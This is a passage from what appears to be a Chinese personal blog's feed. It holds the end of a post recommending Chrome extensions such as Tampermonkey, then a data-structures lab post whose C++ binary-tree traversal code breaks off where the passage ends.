href="https://chrome.google.com/webstore/detail/extension-manager/gjldcdngmdknpinoemndlidpcabkggco" target="_blank" rel="noopener">点我下载</a></p><h1 id="tampermonkey-you-hou">Tampermonkey(油猴)</h1><h2 id="gong-neng-12" id="功能-v13"><a class="header-anchor" href="#功能-v13">¶</a>功能</h2><p>丰富的脚本实现类似插件的功能</p><h2 id="shuo-ming-12" id="说明-v13"><a class="header-anchor" href="#说明-v13">¶</a>说明</h2><p>把它放在了最后不是因为它不好用，而是它太强大了。上面所说的查词就是用这其中的一个js脚本代替的。</p><p>它能干的事可太多了，比如下面这些</p><ul><li>查词(类似沙拉查词)</li><li>智慧树、超星等自动刷课、搜练习答案(脚本虽好还是要好好学习的)</li><li>破解影视vip(其实就是比如爱奇艺那个页面有个按钮可快速跳转到某些不要钱看视频的网站)</li><li>百度网盘自动填写密码</li><li>方便各个浏览器跳转</li></ul><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200423193654058.png"  alt="image-20200423193654058"></p><ul><li>还有很多不一一列举</li></ul><h2 id="wen-juan" id="问卷"><a class="header-anchor" href="#问卷">¶</a>问卷</h2><p>如果你对上面的油猴插件感兴趣，下方留言，我视情况选择是否出篇文章分享。</p><h1 id="xie-zai-zui-hou">写在最后</h1><p>分享不易，如果对你有帮助，可下方留言博客点个关注互动下。</p><p>还望支持下我的CSDN :<a href="https://blog.csdn.net/zss192" target="_blank" rel="noopener">点我查看</a></p><p>不然我也不知道对你们有没有帮助，真的没动力继续分享下去了。</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/743d495a90ad5ee0bda0392bbe883ce6064056dc311b34aae.jpg"  alt="743d495a90ad5ee0bda0392bbe883ce6064056dc311b34aae"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;xie-zai-qian-mian&quot;&gt;写在前面&lt;/h1&gt;
&lt;p&gt;谷歌浏览器算是我日常用的最多的软件了，之所以谷歌会那么强，很大一部分原因就是其丰富的插件便利了日常操作。&lt;/p&gt;
&lt;p&gt;先放张这次要提及的所有插件的图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/&quot; clas
      
    
    </summary>
    
    
      <category term="日常办公" scheme="http://zssblog.top/categories/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
    
      <category term="日常办公" scheme="http://zssblog.top/tags/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
  </entry>
  
  <entry>
    <title>实验四 二叉树的操作</title>
    <link href="http://zssblog.top/2020/04/23/%E5%AE%9E%E9%AA%8C%E5%9B%9B-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%93%8D%E4%BD%9C/"/>
    <id>http://zssblog.top/2020/04/23/%E5%AE%9E%E9%AA%8C%E5%9B%9B-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%93%8D%E4%BD%9C/</id>
    <published>2020-04-23T09:07:00.000Z</published>
    <updated>2020-04-23T09:08:15.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="shi-yan-xing-zhi-zong-he-xing-shi-yan">实验性质：综合性实验</h1><h1 id="yao-qiu">要求：</h1><p>(1) 采用二叉链表结构建立二叉树；<br>(2) 编程实现二叉树的先序、中序、后序和层序遍历；<br>(3) 编程实现非递归中序遍历<br>(3) 编程实现：求二叉树的高度和叶子结点个数；</p><h1 id="mu-de">目的：</h1><p>（1）掌握二叉树的二叉链表存储方式及二叉树的特征；<br>（2）验证二叉树在二叉链表存储结构下遍历操作的实现；</p><h1 id="shi-li">示例</h1><ul><li><p>创建<br>输入 ：ABC##DE#G##F###<br>该输入对应的树如图所示<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200423170621698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p></li><li><p>先序   屏幕输出  A B C D E G F</p></li><li><p>后序   屏幕输出  C G E F D B A</p></li><li><p>中序   屏幕输出  C B E G D F A</p></li><li><p>(中序非递归还需看源代码)</p></li><li><p>层序   屏幕输出  A B C D E F G</p></li><li><p>深度   屏幕显示 深度为5</p></li></ul><h1 id="dai-ma">代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QElemType BiTree</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SElemType BiTree</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 30</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> TElemType;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义二叉链表存储结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    TElemType data;  <span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span>  <span class="comment">//指针域</span></span><br><span class="line">&#125;BiTNode,*BiTree;</span><br><span class="line"><span class="comment">//循环队列类型定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    QElemType *base;</span><br><span class="line">    <span class="keyword">int</span> front;</span><br><span class="line">    <span class="keyword">int</span> rear;</span><br><span class="line">&#125;SqQueue;</span><br><span class="line"><span class="comment">//顺序栈定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    SElemType *base;</span><br><span class="line">    SElemType *top;</span><br><span class="line">    <span class="keyword">int</span> stacksize;</span><br><span class="line">&#125;SqStack;</span><br><span class="line"><span class="comment">//二叉树</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitBiTree</span><span class="params">(BiTree &amp;T)</span></span>;    <span class="comment">//构造空二叉树</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateBiTree</span><span class="params">(BiTree &amp;T)</span></span>;<span class="comment">//先序遍历建立二叉链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PreOrderTraverse</span><span class="params">(BiTree T)</span></span>; <span class="comment">//先序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrderTraverse</span><span class="params">(BiTree T)</span></span>; <span class="comment">//中序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PostOrderTraverse</span><span class="params">(BiTree T)</span></span>;   <span class="comment">//后序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LevelOrderTraverse</span><span class="params">(BiTree T)</span></span>;  <span class="comment">//层序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrderTraverse2</span><span class="params">(BiTree T)</span></span>;    <span class="comment">//非递归中序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Depth</span><span class="params">(BiTree T)</span></span>; <span class="comment">//计算二叉树深度</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LeafCount</span><span class="params">(BiTree bt)</span></span>;  <span class="comment">//计算叶子节点个数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//顺序栈</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">InitStack</span><span class="params">(SqStack &amp;S)</span></span>; <span class="comment">//顺序栈的初始化</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Push</span><span class="params">(SqStack &amp;S,SElemType e)</span></span>;<span class="comment">//顺序栈的入栈</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Pop</span><span class="params">(SqStack &amp;S,SElemType e)</span></span>; <span class="comment">//删除栈顶元素</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">StackEmpty</span><span class="params">(SqStack S)</span></span>;</span><br><span class="line"><span class="function">SElemType <span class="title">GetTop</span><span class="params">(SqStack S)</span></span>; <span class="comment">//取栈顶元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//队列</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">InitQueue</span><span class="params">(SqQueue &amp;Q)</span></span>;<span class="comment">//初始化队列</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">EnQueue</span><span class="params">(SqQueue &amp;Q,QElemType e)</span></span>;<span class="comment">//元素入队</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">DeQueue</span><span class="params">(SqQueue &amp;Q,QElemType &amp;e)</span></span>;<span class="comment">//元素出队</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">DestroyQueue</span><span class="params">(SqQueue &amp;Q)</span></span>;<span class="comment">//销毁队列</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">QueueEmpty</span><span class="params">(SqQueue Q)</span></span>;<span class="comment">//队列判空</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span>;  <span class="comment">//文字菜单提示信息</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BiTree T;</span><br><span class="line">    InitBiTree(T);</span><br><span class="line">    Menu();</span><br><span class="line">    <span class="keyword">int</span> i;  <span class="comment">//输入的数字</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入操作代码："</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;i;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span>(i)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入字符序列,#代表空："</span>;</span><br><span class="line">            CreateBiTree(T);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"创建成功"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"先序遍历结果为："</span>;</span><br><span class="line">            PreOrderTraverse(T);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"中序遍历结果为："</span>;</span><br><span class="line">            InOrderTraverse(T);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"后序遍历结果为："</span>;</span><br><span class="line">            PostOrderTraverse(T);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"层序遍历结果为："</span>;</span><br><span class="line">            LevelOrderTraverse(T);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"非递归中序遍历结果为："</span>;</span><br><span class="line">            InOrderTraverse2(T);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"二叉树深度为："</span>&lt;&lt;Depth(T)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"二叉树叶子结点个数为："</span>&lt;&lt;LeafCount(T)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">if</span>(i&lt;<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入的位置非法，请重新输入"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入操作代码："</span>;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//二叉树</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitBiTree</span><span class="params">(BiTree &amp;T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    T = <span class="keyword">new</span> BiTNode;</span><br><span class="line">    T-&gt;lchild = T-&gt;rchild = <span class="literal">NULL</span>;</span><br><span class="line">    T-&gt;data = <span class="string">'#'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateBiTree</span><span class="params">(BiTree &amp;T)</span> <span class="comment">//先序遍历建立二叉链表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;ch;</span><br><span class="line">    <span class="keyword">if</span>(ch==<span class="string">'#'</span>)</span><br><span class="line">        T=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        T=<span class="keyword">new</span> BiTNode;</span><br><span class="line">        T-&gt;data=ch;</span><br><span class="line">        CreateBiTree(T-&gt;lchild);    <span class="comment">//递归创建左子树</span></span><br><span class="line">        CreateBiTree(T-&gt;rchild);    <span class="comment">//递归创建右子树</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PreOrderTraverse</span><span class="params">(BiTree T)</span> <span class="comment">//先序遍历</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;T-&gt;data;  <span class="comment">//访问根节点</span></span><br><span class="line">        PreOrderTraverse(T-&gt;lchild); <span class="comment">//先序遍历左子树</span></span><br><span class="line">        PreOrderTraverse(T-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrderTraverse</span><span class="params">(BiTree T)</span> <span class="comment">//中序遍历</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T)</span><br><span class="line">    &#123;</span><br><span class="line">        InOrderTraverse(T-&gt;lchild); <span class="comment">//中序遍历左子树</span></span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;T-&gt;data;  <span class="comment">//访问根节点</span></span><br><span class="line">        InOrderTraverse(T-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PostOrderTraverse</span><span class="params">(BiTree T)</span>   <span class="comment">//后序遍历</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T)</span><br><span class="line">    &#123;</span><br><span class="line">        PostOrderTraverse(T-&gt;lchild); <span class="comment">//后序遍历左子树</span></span><br><span class="line">        PostOrderTraverse(T-&gt;rchild);</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;T-&gt;data;  <span class="comment">//访问根节点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LevelOrderTraverse</span><span class="params">(BiTree T)</span>  <span class="comment">//层序遍历</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="comment">//将每一层的节点分别入队列，然后分别读取，读取后继续将它们的子节点入队，所以保证是按照一层一层来遍历的</span></span><br><span class="line">    BiTree P=T;</span><br><span class="line">    SqQueue Q;</span><br><span class="line">    InitQueue(Q);   <span class="comment">//初始化队列</span></span><br><span class="line">    <span class="keyword">if</span>(P)</span><br><span class="line">    &#123;</span><br><span class="line">        EnQueue(Q,P);</span><br><span class="line">        <span class="keyword">while</span>(!QueueEmpty(Q))</span><br><span class="line">        &#123;</span><br><span class="line">            DeQueue(Q,P);   <span class="comment">//出队列</span></span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;P-&gt;data;</span><br><span class="line">            <span class="keyword">if</span>(P-&gt;lchild)</span><br><span class="line">                EnQueue(Q,P-&gt;lchild);</span><br><span class="line">            <span class="keyword">if</span>(P-&gt;rchild)</span><br><span class="line">                EnQueue(Q,P-&gt;rchild);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    DestroyQueue(Q);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrderTraverse2</span><span class="params">(BiTree T)</span>    <span class="comment">//非递归中序遍历</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SqStack S;InitStack(S);</span><br><span class="line">    BiTree p=T;BiTree q=<span class="keyword">new</span> BiTNode;</span><br><span class="line">    <span class="keyword">while</span>(p||!StackEmpty(S))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(p)</span><br><span class="line">        &#123;</span><br><span class="line">            Push(S,p);</span><br><span class="line">            p=p-&gt;lchild;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            q=GetTop(S);</span><br><span class="line">            Pop(S,q);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;q-&gt;data;</span><br><span class="line">            p=q-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Depth</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> m=Depth(T-&gt;lchild);</span><br><span class="line">        <span class="keyword">int</span> n=Depth(T-&gt;rchild);</span><br><span class="line">        <span class="keyword">if</span>(m&gt;n)</span><br><span class="line">            <span class="keyword">return</span>(m+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span>(n+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LeafCount</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!T)          <span class="comment">//结点为空</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(!T-&gt;lchild&amp;&amp;!T-&gt;rchild)      <span class="comment">//没有子节点了</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> LeafCount(T-&gt;lchild)+LeafCount(T-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//顺序栈</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">InitStack</span><span class="params">(SqStack &amp;S)</span> <span class="comment">//顺序栈的初始化</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    S.base=<span class="keyword">new</span> SElemType[MAXSIZE];</span><br><span class="line">    <span class="keyword">if</span>(!S.base)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        S.top=S.base;   <span class="comment">//top初始化为base,空栈</span></span><br><span class="line">        S.stacksize=MAXSIZE;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Push</span><span class="params">(SqStack &amp;S,SElemType e)</span><span class="comment">//顺序栈的入栈</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top-S.base==S.stacksize)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        *S.top++=e;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Pop</span><span class="params">(SqStack &amp;S,SElemType e)</span> <span class="comment">//删除栈顶元素</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span 